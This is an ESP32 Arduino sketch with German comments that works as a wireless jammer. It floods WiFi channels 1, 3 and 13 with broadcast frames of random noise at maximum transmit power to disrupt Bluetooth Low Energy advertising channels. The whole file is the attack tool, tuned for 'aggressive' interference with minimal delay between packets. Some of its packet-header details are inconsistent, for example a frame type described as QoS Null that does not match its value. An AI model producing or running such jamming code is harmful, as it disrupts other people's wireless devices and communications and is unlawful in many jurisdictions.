#include <WiFi.h>
#include <esp_wifi.h>

// BLE-Kanäle auf optimierte WiFi-Kanäle gemappt
int bleChannels[] = {1, 3, 13};  // CH 13 statt 14 (EU)
int currentChannel = 0;

// IRAM-beschleunigte Funktionen
void IRAM_ATTR jamWiFiChannel(uint8_t wifiChannel) {
  esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
  
  // Maximale Sendeleistung
  esp_wifi_set_max_tx_power(84);
  
  // Größeres Paket = längere Sendezeit = mehr Störung
  uint8_t longPacket[256];
  longPacket[0] = 0xD0;  // QoS Null Data Frame (kein ACK erforderlich!)
  longPacket[1] = 0x00;
  longPacket[2] = 0x08;  // Duration für Kanal-Belegung
  longPacket[3] = 0x00;
  for(int i = 4; i < 28; i++) longPacket[i] = 0xFF;  // Broadcast MACs
  longPacket[22] = 0x00;
  longPacket[23] = 0x00;
  longPacket[24] = 0x00;  // QoS Control
  longPacket[25] = 0x00;
  for(int i = 26; i < 256; i++) longPacket[i] = random(0, 255);  // Rauschen
  
  // Aggressiver: Nur minimale Verzögerung
  for(int i = 0; i < 10000; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, longPacket, 256, false);
    delayMicroseconds(5);  // Nur 5µs - gerade genug für DMA-Nachschub
  }
}

void setup() {
  Serial.begin(115200);
  
  // 1) CPU-Takt auf Maximum
  setCpuFrequencyMhz(240);
  
  // 2) WiFi PHY auf 802.11b (höhere Reichweite, weniger Protokoll-Overhead)
  WiFi.mode(WIFI_MODE_STA);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B);
  esp_wifi_init(&cfg);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);  // Flash-Zugriffe vermeiden
  esp_wifi_start();
  
  // 3) Maximale Sendeleistung
  esp_wifi_set_max_tx_power(84);
  
  // 4) PHY-Rate auf 1 Mbps (maximale Reichweite pro Paket)
  esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);
  
  Serial.println("Bereit! EXTREME MODE | 240MHz | 1Mbps");
}

void loop() {
  int ch = bleChannels[currentChannel];
  
  jamWiFiChannel(ch);
  
  currentChannel = (currentChannel + 1) % 3;
  Serial.printf("CH %d → BLE %d MHz\n", ch, 2402 + (currentChannel == 0 ? 0 : currentChannel == 1 ? 24 : 78));
}
